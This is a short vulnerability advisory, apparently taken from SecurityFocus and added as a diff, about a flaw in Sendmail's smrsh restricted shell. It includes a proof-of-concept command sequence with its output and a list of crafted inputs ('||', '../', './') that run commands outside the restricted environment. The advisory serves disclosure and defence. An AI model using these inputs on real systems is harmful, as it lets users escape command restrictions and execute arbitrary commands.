@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/5845/info
+
+Sendmail is a freely available, open source mail transport agent. It is maintained and distributed by the Sendmail Consortium. Sendmail is available for the Unix and Linux operating systems.
+
+smrsh is designed to prevent the execution of commands outside of the restricted environment. However, when commands are entered using either double pipes (||) or a mixture of dot (.) and slash (/) characters, a user may be able to bypass the checks performed by smrsh. This could lead to the execution of commands outside of the restricted environment. 
+
+$ echo "echo unauthorized execute" > /tmp/unauth
+$ smrsh -c ". || . /tmp/unauth || ."
+/bin/sh: /etc/smrsh/.: is a directory
+unauthorized execute
+
+OR one of the following types of commands:
+
+smrsh -c "/ command"
+smrsh -c "../ command"
+smrsh -c "./ command"
+smrsh -c "././ command" 
